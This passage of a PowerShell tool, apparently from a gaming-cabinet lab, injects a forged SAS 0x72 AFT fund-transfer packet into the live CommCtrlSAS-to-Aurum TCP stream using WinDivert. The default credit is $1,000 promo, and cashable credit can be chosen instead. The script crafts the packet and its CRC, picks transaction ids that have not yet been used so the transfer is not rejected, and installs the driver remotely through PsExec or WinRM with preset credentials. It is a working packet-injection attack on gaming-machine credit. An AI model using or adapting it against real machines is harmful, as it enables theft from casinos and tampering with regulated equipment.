<#
.SYNOPSIS
    Inject a raw SAS 0x72 AFT "transfer funds" ($1,000 promo) command into the EXISTING
    CommCtrlSAS -> Aurum loopback TCP stream using WinDivert, with no IGT tester.

.DESCRIPTION
    A plain TcpClient to bridge port 31150 opens a NEW connection that CommCtrlSAS never
    merges into the live SAS stream, so Aurum never ingests it (proven dead-end; see the
    "What does NOT work" section of aft/RUNBOOK.md).

    This tool instead uses WinDivert to capture the live outbound flow
    CommCtrlSAS:31150 -> Aurum:<ephemeral>, forwards every packet unchanged, and on the
    first data packet injects a crafted TCP segment carrying our 0x1B-framed SAS 0x72
    command at SEQ = origSeq + origPayloadLen, into the same flow. Aurum reads it as the
    next in-order bytes on its established SAS connection and processes the transfer.

    The ephemeral destination port is discovered live by WdInject.exe (never hardcoded).
    A SAS link RST/reconnect after the injection is expected and acceptable.

    Default mode is -DryRun (no staging, no injection).

.EXAMPLE
    .\Invoke-WinDivertAft.ps1 -DryRun

.EXAMPLE
    .\Invoke-WinDivertAft.ps1 -Send

.EXAMPLE
    # Optional: force a specific two-digit transaction number for debugging only.
    # Normal use should leave this unset so duplicate ids are avoided.
    .\Invoke-WinDivertAft.ps1 -Send -TransactionNumber 31

.EXAMPLE
    # Target a different cabinet by IP (-IP is an alias of -ComputerName)
    .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.110
#>
[CmdletBinding(DefaultParameterSetName = 'DryRun')]
param(
    [Alias('h')]
    [switch] $Help,

    [Alias('IP')]
    [string] $ComputerName = '10.0.0.90',
    [int64]  $AmountCents = 100000,
    [int64]  $Amount = 0,
    [int]    $AssetNumber = 777,
    [int]    $TransactionNumber = 0,
    [byte]   $SasAddress = 0x01,
    # BridgePort 0 = auto-detect live CommCtrlSAS<->Aurum ESTABLISHED port (31150 slot / 30550 roulette).
    [int]    $BridgePort = 31150,
    [ValidateSet('Auto', 'Slot', 'Roulette')]
    [string] $CabinetProfile = 'Auto',
    [switch] $AutoBridgePort,

    # Observation window (ms) WdInject.exe waits for ANY outbound segment on $BridgePort
    # before giving up, and the ACK-anchor grace window (ms): when only bare ACKs flow on
    # an idle-but-ESTABLISHED connection, WdInject prefers a payload segment for this long
    # before anchoring on the latest pure-ACK seq. $AckGraceMs = 0 disables ACK-anchoring
    # (legacy payload-only behavior). The grace window must fit inside $ObserveMs.
    [int]    $ObserveMs = 8000,
    [int]    $AckGraceMs = 600,

    [string] $PsExecPath = 'C:\Tools\PSTools\PsExec.exe',
    [string] $WinDivertDir = 'C:\Tools\WinDivert\extracted\WinDivert-2.2.2-A\x64',
    [int]    $MaxRetries = 3,

    # When -Send and cabinet sasmsgr shows no recent 80/81 polls, establish host polls:
    #   Auto (default)  -  WinDivert TCP poll sim on the cabinet (no COM/MUX); fallback COM4 keeper
    #   WinDivert       -  TCP poll sim only (WdPollInject pollaft + AFT in one session)
    #   Com             -  legacy COM4 sas_poll_keeper + separate WdInject.exe
    #   None            -  no auto polls (-NoAutoSasPoll forces this)
    [ValidateSet('Auto', 'WinDivert', 'Com', 'None')]
    [string] $SasPollMode = 'WinDivert',
    [string] $SasComPort = 'COM4',
    [int]    $SasPollWarmupSec = 4,
    [int]    $WinDivertPollSeconds = 14,
    [int]    $WinDivertPollIntervalMs = 200,
    [int]    $WinDivertPollInjectDelayMs = 2000,
    [int]    $WinDivertPollDrainSec = 6,
    [int]    $WinDivertEphemWaitSec = 90,
    [Nullable[datetime]] $PollBaselineUtc,
    [int]    $PollAftRetryDelaySec = 25,
    [int]    $AurumReadyWaitSec = 120,
    [int]    $AurumWarmupSec = 30,
    [int]    $AurumPostWakeSettleSec = 8,
    [int]    $CreditWaitSec = 30,
    [switch] $SkipAurumReadyWait,
    [switch] $NoAutoWake,
    [switch] $NoAutoBootstrap,
    [switch] $NoAutoSasPoll,

    # Self-healing pre-inject loop: detect/fix polls + wake before aborting (default 4 cycles).
    [int]    $MaxRemediationCycles = 4,
    [int]    $RemediationPollWaitSec = 0,
    [int]    $StaleWakeMin = 5,

    # WinRM by IP needs explicit NTLM credentials. On lab fleet IPs this is auto-filled
    # from LabAccess.ps1 (GOLD-CLUB\test) unless you pass -Credential yourself.
    [pscredential] $Credential,

    # Transfer-type selection: route the amount into exactly one SAS 0x72 amount
    # field. Default (none) = non-restricted (promo), the verified working behavior.
    [Alias('c')]  [switch] $Cashable,
    [Alias('r')]  [switch] $Restricted,
    [Alias('nr')] [switch] $NonRestricted,

    # Maintenance: safely tear down the WinDivert driver service on the cabinet, then
    # exit. Only deletes when the service is actually STOPPED (never while STOP_PENDING),
    # so it cannot create the "marked for deletion" wedge. Runs no injection.
    [switch] $RemoveDriver,

    [Parameter(ParameterSetName = 'DryRun')]
    [switch] $DryRun,

    [Parameter(ParameterSetName = 'Send', Mandatory = $true)]
    [switch] $Send,

    [Parameter(ValueFromRemainingArguments = $true)]
    [object[]] $RemainingArgs
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

function Resolve-WinDivertDir {
    param([string] $Preferred)
    $candidates = @()
    if ($Preferred) { $candidates += $Preferred }
    $candidates += @(
        'C:\Tools\WinDivert\extracted\WinDivert-2.2.2-A\x64',
        'C:\Tools\WinDivert\x64'
    )
    foreach ($dir in ($candidates | Select-Object -Unique)) {
        $dll = Join-Path $dir 'WinDivert.dll'
        $sys = Join-Path $dir 'WinDivert64.sys'
        if ((Test-Path -LiteralPath $dll) -and (Test-Path -LiteralPath $sys)) {
            return $dir
        }
    }
    throw @(
        'WinDivert x64 not found. Expected WinDivert.dll + WinDivert64.sys under one of:',
        '  C:\Tools\WinDivert\x64',
        '  C:\Tools\WinDivert\extracted\WinDivert-2.2.2-A\x64',
        'Pass -WinDivertDir <folder> or extract WinDivert 2.2.2 x64 to C:\Tools\WinDivert\x64.'
    ) -join "`n"
}

function Show-WinDivertAftHelp {
    $runbook = Join-Path (Split-Path $PSScriptRoot -Parent) 'aft\RUNBOOK.md'
    $readme = Join-Path (Split-Path $PSScriptRoot -Parent) 'aft\README.md'
    Write-Host @"
Invoke-WinDivertAft.ps1  -  inject raw SAS 0x72 AFT transfer into live CommCtrlSAS bridge -> Aurum stream (WinDivert).

PREREQUISITES
  Cabinet reachable (admin C$), PsExec + WinDivert on this host, CommCtrlSAS + Aurum running.
  Slot bridge port: 31150. Roulette: ClientsSet WakeUpPort (usually 30550). Use -AutoBridgePort / -CabinetProfile Roulette.
  On -Send: WinDivert pollaft (1B80/1B81 + AFT); works with IGT tester on or off.
  AutoWake restarts wedged bridge (suppressed while organic/tester polls are live).
    -SasPollMode WinDivert  default  -  pollaft only (no COM fallback)
    -NoAutoWake              skip automatic service restart on failure
    -NoAutoBootstrap         skip automatic cmdkey/PsExec credential bootstrap (debug only)
    -NoAutoSasPoll           external polls required (legacy WdInject path)
  Cashout AFT EXCEPTION 66 is ignored; hard-block is open transfer / exception 69.

MODES
  Default = DryRun (prints packet; injects nothing). Pass -Send for live injection.

TARGET
  -IP <addr>  or  -ComputerName <addr>   (default 10.0.0.90)
  -CabinetProfile Auto|Slot|Roulette     (Auto detects ruleta tree)
  -BridgePort <n>                        (0 or -AutoBridgePort = probe live ESTABLISHED)
  -AutoBridgePort                        probe 31150/30550 (roulette prefers 30550)

AMOUNT (raw credits / base units; default 100000 = `$1,000 if 1 unit = 1 cent)
  -Amount <int>              explicit amount (also: unnamed int after -IP, or after -c/-r/-nr)
  -AmountCents <int>         legacy alias for -Amount

TRANSFER TYPE (exactly one; default = non-restricted/promo)
  -nr [<amount>]   non-restricted (promo)
  -c  [<amount>]   cashable
  -r  [<amount>]   restricted

EXAMPLES (see $runbook)
  .\Invoke-WinDivertAft.ps1 -Help
  .\Invoke-WinDivertAft.ps1 -DryRun
  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 -c 1000000
  .\lab\roulette\Invoke-WinDivertAftRoulette.ps1 -Send
  .\Invoke-WinDivertAft.ps1 -Send -IP 10.0.0.90 -CabinetProfile Roulette -AutoBridgePort

TRANSPORT
  WinRM (port 5985) is preferred when reachable  -  much faster than PsExec (~2-5s vs ~45s).
  Lab fleet IPs auto-use GOLD-CLUB\test (see LabAccess.ps1 / Initialize-LabAccess.ps1).

DOCS
  $runbook
  $readme
  lab\roulette\README.md
"@
}

$script:PsExecAuthArgs = @()
$script:CredentialFromLab = $false
$labRemoteTransportPath = Join-Path $PSScriptRoot 'LabRemoteTransport.ps1'
if (-not (Test-Path -LiteralPath $labRemoteTransportPath)) {
    throw "Missing $labRemoteTransportPath"
}
. $labRemoteTransportPath
$labSasPollDiagPath = Join-Path $PSScriptRoot 'LabSasPollDiagnostics.ps1'
if (-not (Test-Path -LiteralPath $labSasPollDiagPath)) {
    throw "Missing $labSasPollDiagPath"
}
. $labSasPollDiagPath
$labCtx = Initialize-LabRemoteContext -ComputerName $ComputerName -Credential $Credential
$Credential = $labCtx.Credential
$script:CredentialFromLab = $labCtx.CredentialFromLab
$script:PsExecAuthArgs = @($labCtx.PsExecAuthArgs)
$script:PollAutoWakeAttempted = $false
$script:InjectBootstrapReport = $null

if ($Help -or $RemainingArgs -contains '/?' -or $RemainingArgs -contains '-?') {
    Show-WinDivertAftHelp
    exit 0
}

# Optional positional amount: one unnamed positive int (after -IP and/or after -c/-r/-nr).
$trailingArgs = @($RemainingArgs) | Where-Object { $_ -ne $null -and [string]$_ -ne '' }
$positionalAmount = $null
$unexpectedTrailing = New-Object System.Collections.Generic.List[object]
foreach ($arg in $trailingArgs) {
    $text = [string]$arg
    if ($null -eq $positionalAmount -and $text -match '^\d+$') {
        $parsed = [int64]$text
        if ($parsed -gt 0) {
            $positionalAmount = $parsed
            continue
        }
    }
    $unexpectedTrailing.Add($arg) | Out-Null
}
if ($unexpectedTrailing.Count -gt 0) {
    throw "Unexpected argument(s): $($unexpectedTrailing -join ', '). Run with -Help for usage."
}
if ($null -ne $positionalAmount) {
    if ($PSBoundParameters.ContainsKey('Amount') -and $Amount -gt 0 -and $Amount -ne $positionalAmount) {
        throw "Conflicting amount: -Amount $Amount vs positional $positionalAmount. Run with -Help for usage."
    }
    if (-not $PSBoundParameters.ContainsKey('Amount') -or $Amount -le 0) {
        $Amount = $positionalAmount
    }
}

# Whole-run stopwatch: the final TIMING block reports the full cycle (and phase breakdown).
$swTotal = [System.Diagnostics.Stopwatch]::StartNew()

if ($RemoveDriver) {
    # Explicit, SAFE teardown. The per-run path never deletes the service (see the remote
    # finally), so this is the only place we remove it -- and it deletes ONLY when the
    # service is actually STOPPED. If it is STOP_PENDING (a referenced/wedged driver), we
    # refuse to delete (deleting then is what marks it for deletion until reboot) and tell
    # the operator a reboot is required.
    if (-not (Test-Path -LiteralPath $PsExecPath)) {
        throw "PsExec not found at $PsExecPath (needed for -RemoveDriver)."
    }
    Write-Host "[*] Safe WinDivert teardown on $ComputerName ..." -ForegroundColor Cyan
    $teardown = @'
$ErrorActionPreference = 'Continue'
$q = (& sc.exe query WinDivert 2>&1) -join "`n"
if ($q -match '1060') { 'WINDIVERT_NOT_INSTALLED'; return }
if ($q -match 'STOP_PENDING') { 'WINDIVERT_STOP_PENDING_REBOOT_REQUIRED'; return }
& sc.exe stop WinDivert | Out-Null
for ($i = 0; $i -lt 24; $i++) {
    $s = (& sc.exe query WinDivert 2>&1) -join "`n"
    if ($s -match '1060' -or $s -match 'STOPPED' -or $s -match 'STOP_PENDING') { break }
    Start-Sleep -Milliseconds 250
}
$s = (& sc.exe query WinDivert 2>&1) -join "`n"
if ($s -match '1060') { 'WINDIVERT_NOT_INSTALLED' }
elseif ($s -match 'STOP_PENDING') { 'WINDIVERT_STOP_PENDING_REBOOT_REQUIRED' }
elseif ($s -match 'STOPPED') { & sc.exe delete WinDivert | Out-Null; 'WINDIVERT_DELETED' }
else { 'WINDIVERT_NOT_STOPPED_SKIP_DELETE' }
'@
    $enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($teardown))
    $psArgs = @("\\$ComputerName", '-accepteula') + @($script:PsExecAuthArgs) + @('-s', '-n', '30',
        'powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $enc)
    $result = (& $PsExecPath @psArgs 2>&1) | Out-String
    switch -Regex ($result) {
        'WINDIVERT_DELETED' { Write-Host "[+] WinDivert service stopped and deleted cleanly." -ForegroundColor Green }
        'WINDIVERT_NOT_INSTALLED' { Write-Host "[*] WinDivert service is not installed (nothing to remove)." -ForegroundColor Green }
        'WINDIVERT_STOP_PENDING_REBOOT_REQUIRED' { Write-Warning "WinDivert is STOP_PENDING (referenced kernel driver). NOT deleting (would mark-for-deletion). Reboot $ComputerName to clear it." }
        'WINDIVERT_NOT_STOPPED_SKIP_DELETE' { Write-Warning "WinDivert did not reach STOPPED in time; skipped delete to avoid a wedge. Retry shortly or reboot $ComputerName." }
        default { Write-Warning "Teardown result unclear:`n$result" }
    }
    return
}

function Test-CabinetAftTransactionSeen {
    param(
        [string] $Computer,
        [int]    $TxnNumber
    )
    $logPath = Get-SasmsgrLogPath -Computer $Computer
    if (-not (Test-Path -LiteralPath $logPath)) { return $false }

    $txnHex = -join ([Text.Encoding]::ASCII.GetBytes("Transaction$TxnNumber") | ForEach-Object { '{0:X2}' -f $_ })
    # sasmsgr logs are large on the lab cabinet. A bounded tail scan catches the
    # recently burned ids that matter for retries/resets without making dry-runs
    # wait on a full UNC file scan.
    return [bool](Get-Content -LiteralPath $logPath -Tail 12000 -ErrorAction SilentlyContinue | Select-String -Pattern $txnHex -SimpleMatch -Quiet)
}

function Test-CabinetAftTransactionBurned {
    param(
        [string] $Computer,
        [int]    $TxnNumber
    )
    if (Test-CabinetAftTransactionSeen -Computer $Computer -TxnNumber $TxnNumber) {
        return $true
    }
    $txnToken = "Transaction$TxnNumber"
    $aurumPath = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    if (-not (Test-Path -LiteralPath $aurumPath)) { return $false }
    $aurumPatterns = @(
        "TRANSFER REQUEST FROM SERVER FINISHED.*$txnToken",
        "TRANSFER REQUEST FROM SERVER STARTED.*$txnToken"
    )
    foreach ($line in (Get-Content -LiteralPath $aurumPath -Tail 4000 -ErrorAction SilentlyContinue)) {
        foreach ($pat in $aurumPatterns) {
            if ($line -match $pat) { return $true }
        }
    }
    return $false
}

function Get-NextAftTransactionNumber {
    param([int] $Current)
    if ($Current -lt 99) { return ($Current + 1) }
    return 10
}

function Resolve-NextFreeAftTransactionNumber {
    param(
        [string] $Computer,
        [int]    $AfterNumber
    )
    $next = Get-NextAftTransactionNumber -Current $AfterNumber
    $skipped = New-Object System.Collections.Generic.List[int]
    for ($i = 0; $i -lt 90; $i++) {
        if (-not (Test-CabinetAftTransactionBurned -Computer $Computer -TxnNumber $next)) {
            return @{ Number = $next; Skipped = ,[int[]]($skipped.ToArray()) }
        }
        $skipped.Add($next) | Out-Null
        $next = Get-NextAftTransactionNumber -Current $next
    }
    throw "All auto transaction numbers 10..99 are burned in today's sasmsgr/Aurum logs for $Computer; pass -TransactionNumber explicitly."
}

function Save-AutoAftTransactionState {
    param(
        [hashtable] $State,
        [string]    $Path,
        [string]    $Computer,
        [int]       $NextNumber
    )
    if (-not $Path) { return }
    $State[$Computer] = $NextNumber
    try {
        $State | ConvertTo-Json | Set-Content -LiteralPath $Path -Encoding UTF8
    }
    catch {
        Write-Host "[!] Could not save auto transaction state: $_" -ForegroundColor Yellow
    }
}

function Test-AftDuplicateTransactionRejected {
    param(
        [string]   $Computer,
        [datetime] $StartUtc,
        [datetime] $EndUtc,
        [int]      $TxnNumber
    )
    foreach ($line in (Find-AftFailureEvidence -Computer $Computer -StartUtc $StartUtc -EndUtc $EndUtc -TxnNumber $TxnNumber)) {
        if ($line -match 'TRANSACTION ID IS THE SAME AS IN MOST RECENT TRANSACTION') {
            return $true
        }
    }
    return $false
}

$script:CabinetClockCache = @{}
function Get-CabinetClockDate {
    # GoldClub names daily logs from the EGM clock. After a trial-lock rollback the
    # workstation date (e.g. 26 Aug) does not match the file on disk (10 Aug).
    param([string] $Computer)
    $nowWs = Get-Date
    if ($script:CabinetClockCache.ContainsKey($Computer)) {
        $hit = $script:CabinetClockCache[$Computer]
        if (($nowWs - $hit.Fetched).TotalSeconds -lt 45) {
            return $hit.Date
        }
    }
    $remote = $null
    if ($Credential -and (Get-Command Test-LabWinRmReachable -ErrorAction SilentlyContinue) `
            -and (Test-LabWinRmReachable -Computer $Computer)) {
        try {
            $opt = New-PSSessionOption -OperationTimeout 20000 -OpenTimeout 8000
            $remote = Invoke-Command -ComputerName $Computer -Credential $Credential `
                -Authentication Negotiate -SessionOption $opt `
                -ScriptBlock { [pscustomobject]@{ Local = Get-Date; Utc = [datetime]::UtcNow } } `
                -ErrorAction Stop
        }
        catch {
            $remote = $null
        }
    }
    if ($remote) {
        $script:CabinetClockCache[$Computer] = @{
            Date    = [datetime]$remote.Local
            Utc     = [datetime]$remote.Utc
            Fetched = $nowWs
        }
        return [datetime]$remote.Local
    }
    $script:CabinetClockCache[$Computer] = @{ Date = $nowWs; Utc = $nowWs.ToUniversalTime(); Fetched = $nowWs }
    return $nowWs
}

function Get-DatedLogPath {
    param([string] $Computer, [string] $SubFolder, [datetime] $Date)
    $dir = "\\$Computer\c`$\Goldclub\var\log\$SubFolder"
    $tryDates = New-Object System.Collections.Generic.List[datetime]
    $tryDates.Add($Date) | Out-Null
    try {
        $cab = Get-CabinetClockDate -Computer $Computer
        if ($cab.ToString('yyyy-MM-dd') -ne $Date.ToString('yyyy-MM-dd')) {
            $tryDates.Add($cab) | Out-Null
            $tryDates.Add($cab.AddDays(-1)) | Out-Null
            $tryDates.Add($cab.AddDays(1)) | Out-Null
        }
    }
    catch {
        # Keep workstation date only.
    }
    foreach ($d in $tryDates) {
        $candidate = Join-Path $dir ($d.ToString('yyyy-MM-dd') + '.log')
        if (Test-Path -LiteralPath $candidate) {
            return $candidate
        }
    }
    return Join-Path $dir ($Date.ToString('yyyy-MM-dd') + '.log')
}

function Get-SasmsgrLogPath {
    param(
        [string]   $Computer,
        [datetime] $Date = (Get-Date)
    )
    $candidates = @(
        'GoldClub.Aurum.Services sasmsgr of SASControler1',
        'GoldClub.Aurum.Services SASControler1'
    )
    foreach ($sub in $candidates) {
        $path = Get-DatedLogPath -Computer $Computer -SubFolder $sub -Date $Date
        if (Test-Path -LiteralPath $path) {
            return $path
        }
    }
    return (Get-DatedLogPath -Computer $Computer -SubFolder $candidates[0] -Date $Date)
}

$autoTransactionStatePath = $null
$autoTransactionState = $null
$autoTransactionNext = $null
if ($TransactionNumber -le 0) {
    $statePath = Join-Path (Split-Path $PSScriptRoot -Parent) '.aft-windivert-next-transaction.json'
    $state = @{}
    if (Test-Path -LiteralPath $statePath) {
        try {
            $json = Get-Content -LiteralPath $statePath -Raw | ConvertFrom-Json
            foreach ($p in $json.PSObject.Properties) { $state[$p.Name] = [int]$p.Value }
        }
        catch {
            $state = @{}
        }
    }

    $next = if ($state.ContainsKey($ComputerName)) { [int]$state[$ComputerName] } else { 42 }
    if ($next -lt 10 -or $next -gt 99) { $next = 42 }

    $skippedSeen = New-Object System.Collections.Generic.List[int]
    for ($i = 0; $i -lt 90; $i++) {
        if (-not (Test-CabinetAftTransactionBurned -Computer $ComputerName -TxnNumber $next)) { break }
        $skippedSeen.Add($next) | Out-Null
        $next++
        if ($next -gt 99) { $next = 10 }
    }
    if ($skippedSeen.Count -ge 90) {
        throw "All auto transaction numbers 10..99 already appear in today's sasmsgr log for $ComputerName; pass -TransactionNumber explicitly or clear old cabinet logs."
    }
    if ($skippedSeen.Count -gt 0) {
        Write-Host ("[*] Auto transaction id(s) already burned today (sasmsgr/Aurum) for {0}; skipped: {1}" -f $ComputerName, ($skippedSeen -join ', ')) -ForegroundColor DarkGray
    }

    $TransactionNumber = $next

    $next++
    if ($next -gt 99) { $next = 10 }
    $state[$ComputerName] = $next
    $autoTransactionStatePath = $statePath
    $autoTransactionState = $state
    $autoTransactionNext = $next
}

# ---- SAS 0x72 packet builder (see aft/protocol-raw-traffic.md for the byte layout) ----

function ConvertTo-Hex {
    param([byte[]] $Bytes)
    -join ($Bytes | ForEach-Object { '{0:X2}' -f $_ })
}

function ConvertTo-Bcd5 {
    param([int64] $Value)
    if ($Value -lt 0 -or $Value -gt 9999999999) {
        throw "BCD amount out of range: $Value"
    }
    $digits = ('{0:D10}' -f $Value)
    $bytes = New-Object byte[] 5
    for ($i = 0; $i -lt 5; $i++) {
        $hi = [int][string]$digits[$i * 2]
        $lo = [int][string]$digits[$i * 2 + 1]
        $bytes[$i] = [byte](($hi -shl 4) -bor $lo)
    }
    return $bytes
}

function Get-SasCrc16 {
    param([byte[]] $Bytes)
    # SAS uses CRC-16/KERMIT (poly 0x1021 reflected as 0x8408), sent little-endian.
    $crc = 0
    foreach ($b in $Bytes) {
        $crc = $crc -bxor $b
        for ($i = 0; $i -lt 8; $i++) {
            if (($crc -band 1) -ne 0) {
                $crc = ($crc -shr 1) -bxor 0x8408
            }
            else {
                $crc = $crc -shr 1
            }
            $crc = $crc -band 0xFFFF
        }
    }
    return [uint16]$crc
}

function New-AftTransferPacket {
    param(
        [byte] $Address,
        # Backward-compatible alias for the non-restricted (promo) amount.
        [int64] $PromoAmountCents = 0,
        [int64] $CashableAmount = 0,
        [int64] $RestrictedAmount = 0,
        [int64] $NonRestrictedAmount = 0,
        [int] $Asset,
        [int] $TxnNumber
    )

    # Map the legacy single-amount call to the non-restricted field.
    if ($PromoAmountCents -gt 0 -and $NonRestrictedAmount -eq 0) {
        $NonRestrictedAmount = $PromoAmountCents
    }

    $data = New-Object System.Collections.Generic.List[byte]
    $data.Add(0x00) # transfer code: in-house amount from host to EGM
    $data.Add(0x00) # transaction index
    # Transfer type byte kept at 0x00 for all field selections. The existing
    # verified promo injection used 0x00; the cashable/restricted/non-restricted
    # routing is expressed purely by which BCD amount field is non-zero (see report).
    $data.Add(0x00) # transfer type
    $data.AddRange([byte[]](ConvertTo-Bcd5 $CashableAmount))       # cashable
    $data.AddRange([byte[]](ConvertTo-Bcd5 $RestrictedAmount))     # restricted
    $data.AddRange([byte[]](ConvertTo-Bcd5 $NonRestrictedAmount))  # non-restricted (promo)
    $data.Add(0x00) # transfer flags
    $data.AddRange([BitConverter]::GetBytes([uint32]$Asset)) # asset number little-endian
    $data.AddRange((New-Object byte[] 20))                   # registration key (machine NOT registered)

    $txnText = "est Transaction$TxnNumber"
    $txnBytes = New-Object System.Collections.Generic.List[byte]
    $txnBytes.Add(0x00)
    $txnBytes.AddRange([Text.Encoding]::ASCII.GetBytes($txnText))
    $data.Add([byte]$txnBytes.Count)
    $data.AddRange($txnBytes)

    $data.AddRange([byte[]](0x05, 0x30, 0x20, 0x20)) # expiration
    $data.AddRange([byte[]](0x0C, 0x00))             # pool id 0x000C
    $data.Add(0x00)                                  # receipt data length

    $packetNoCrc = New-Object System.Collections.Generic.List[byte]
    $packetNoCrc.Add($Address)
    $packetNoCrc.Add(0x72)
    $packetNoCrc.Add([byte]$data.Count)
    $packetNoCrc.AddRange($data)

    $crc = Get-SasCrc16 ([byte[]]$packetNoCrc.ToArray())
    $packetNoCrc.Add([byte]($crc -band 0xFF))
    $packetNoCrc.Add([byte](($crc -shr 8) -band 0xFF))
    return [byte[]]$packetNoCrc.ToArray()
}

# ---- log verification helpers ----

function Get-LogLineUtc {
    param([string] $TimestampText)
    $t = $TimestampText.Trim()
    if ($t -match 'T') {
        return ([datetimeoffset]$t).UtcDateTime
    }
    # Legacy cabinet lines without offset are Europe/Berlin (+01:00 in summer).
    $parsed = [datetime]::ParseExact($t, @('yyyy-MM-dd HH:mm:ss', 'yyyy-MM-dd HH:mm:ss.fff'), $null, [Globalization.DateTimeStyles]::AllowWhiteSpaces)
    return [datetimeoffset]::new($parsed, [timespan]::FromHours(1)).UtcDateTime
}

function Convert-WorkstationUtcToCabinetLogUtc {
    # Map a workstation UTC instant onto the cabinet log timeline using the EGM clock.
    param(
        [string]   $LogPath,
        [datetime] $Utc,
        [string]   $Computer = '',
        [int]      $TailLines = 40
    )
    $wsNow = (Get-Date).ToUniversalTime()
    $cabUtc = $null
    if ($Computer) {
        try { $null = Get-CabinetClockDate -Computer $Computer } catch { }
        if ($script:CabinetClockCache.ContainsKey($Computer)) {
            $cabUtc = $script:CabinetClockCache[$Computer].Utc
        }
    }
    if ($null -ne $cabUtc -and [math]::Abs(($wsNow - [datetime]$cabUtc).TotalHours) -ge 1) {
        return ([datetime]$cabUtc) - ($wsNow - [datetime]$Utc)
    }
    if ([string]::IsNullOrWhiteSpace($LogPath) -or -not (Test-Path -LiteralPath $LogPath)) {
        return $Utc
    }
    $lastLineUtc = $null
    foreach ($line in (Get-Content -LiteralPath $LogPath -Tail $TailLines -ErrorAction SilentlyContinue)) {
        if ($line -notmatch '^(\S+)') { continue }
        try { $lastLineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
    }
    if ($null -eq $lastLineUtc) { return $Utc }
    $skewHours = ($wsNow - $lastLineUtc).TotalHours
    if ([math]::Abs($skewHours) -lt 1) { return $Utc }
    return $lastLineUtc - ($wsNow - [datetime]$Utc)
}

function Test-LogLineAfter {
    param(
        [string] $Line,
        [datetime] $SinceUtc,
        [int]    $SlackSeconds = 3
    )
    if ($Line -notmatch '^(\S+)') { return $false }
    try {
        $lineUtc = Get-LogLineUtc $Matches[1]
    }
    catch {
        return $false
    }
    return $lineUtc -ge $SinceUtc.AddSeconds(-$SlackSeconds)
}

function Test-LogLineBetween {
    param(
        [string] $Line,
        [datetime] $StartUtc,
        [datetime] $EndUtc,
        [int]    $SlackSeconds = 1
    )
    if ($Line -notmatch '^(\S+)') { return $false }
    try {
        $lineUtc = Get-LogLineUtc $Matches[1]
    }
    catch {
        return $false
    }
    return $lineUtc -ge $StartUtc.AddSeconds(-$SlackSeconds) -and $lineUtc -le $EndUtc
}

function Get-Wat2AftWarmupFailureDetail {
    param(
        [string]   $Computer,
        [int]      $TailLines = 250,
        [Nullable[datetime]] $SinceUtc = $null
    )
    $aurumLog = Get-DatedLogPath -Computer $Computer -SubFolder 'GoldClub.Aurum.Services' -Date (Get-Date)
    $sasmsgrLog = Get-SasmsgrLogPath -Computer $Computer
    $detail = [ordered]@{
        AurumLogPath   = $aurumLog
        SasmsgrLogPath = $sasmsgrLog
        Category       = 'unknown'
        Summary        = 'WAT2AFT UP was not seen in the Aurum log within the warmup window.'
        LastWat2AftUp  = $null
        Evidence       = New-Object System.Collections.Generic.List[string]
        SasPollLine    = $null
    }

    if (-not (Test-Path -LiteralPath $aurumLog)) {
        $detail.Category = 'aurum_log_missing'
        $detail.Summary = "Cannot read today's Aurum log at $aurumLog (SMB path missing or access denied)."
        return $detail
    }

    $lines = @(Get-Content -LiteralPath $aurumLog -Tail $TailLines -ErrorAction SilentlyContinue)
    $sinceCab = if ($null -ne $SinceUtc) {
        Convert-WorkstationUtcToCabinetLogUtc -LogPath $aurumLog -Utc ([datetime]$SinceUtc) -Computer $Computer
    } else { $null }
    $recent = New-Object System.Collections.Generic.List[object]
    foreach ($line in $lines) {
        if ($line -notmatch '^(\S+)') { continue }
        try { $lineUtc = Get-LogLineUtc $Matches[1] } catch { continue }
        if ($null -ne $sinceCab -and $lineUtc -lt $sinceCab) { continue }
        $recent.Add([pscustomobject]@{ Utc = $lineUtc; Line = $line.Trim() }) | Out-Null
    }

    foreach ($item in ($recent | Sort-Object Utc -Descending)) {
        if ($item.Line -match 'WAT2AFT UP') {
            $detail.LastWat2AftUp = $item.Line
            break
        }
    }

    $needles = @(
        @{ Pattern = 'NO OWNED DEVICE FOUND FOR WAT'; Category = 'no_owned_device' }
        @{ Pattern = 'WAT2AFT WILL NOW EXIT'; Category = 'no_owned_device' }
        @{ Pattern = 'Failed connect GCC_ST_'; Category = 'egm_connect_failed' }
        @{ Pattern = 'Failed connect '; Category = 'egm_connect_failed' }
        @{ Pattern = 'connecting GCC_ST_'; Category = 'egm_connect_retry' }
        @{ Pattern = 'Mapping: mapped = false'; Category = 'mapping_false' }
        @{ Pattern = 'AFT exception 69'; Category = 'aft_exception_69' }
        @{ Pattern = 'TRANSACTION CURRENTLY IN PROGRESS'; Category = 'aft_busy' }
    )
    foreach ($item in ($recent | Sort-Object Utc -Descending)) {
        foreach ($n in $needles) {
            if ($item.Line -match $n.Pattern) {
                if ($detail.Evidence.Count -lt 4) {
                    $detail.Evidence.Add($item.Line) | Out-Null
                }
                if ($detail.Category -eq 'unknown') {
                    $detail.Category = $n.Category
                }
                break
            }
        }
    }

    if (Test-Path -LiteralPath $sasmsgrLog) {
        $pollHits = Get-Content -LiteralPath $sasmsgrLog -Tail 120 -ErrorAction SilentlyContinue |
            Select-String -Pattern 'qGMID1:8[01]\s*$'
        if ($pollHits) {
            $detail.SasPollLine = ($pollHits | Select-Object -Last 1).Line.Trim()
        }
    }

    switch ($detail.Category) {
        'no_owned_device' {
            $detail.Summary = @(
                'WAT2AFT cannot own the SAS device  -  the EGM SAS session is offline.',
                'Injected 0x72 may reach sasmsgr but Aurum will not commit credit until general polls (80/81) keep the link alive.'
            ) -join ' '
        }
        'egm_connect_failed' {
            $detail.Summary = @(
                'GoldClub.Aurum.Services cannot connect to the EGM device (GCC_ST_* connect loop).',
                'WAT2AFT never reaches UP while Aurum is failing device connect  -  fix bridge/CommCtrlSAS/OneHand before AFT inject.'
            ) -join ' '
        }
        'egm_connect_retry' {
            if ($detail.Category -ne 'egm_connect_failed') {
                $detail.Summary = 'Aurum is retrying EGM connect; WAT2AFT UP has not appeared yet.'
            }
        }
        'mapping_false' {
            $detail.Summary = 'Aurum mapping is false  -  device enumeration not complete; WAT2AFT UP is unlikely until mapping stabilizes.'
        }
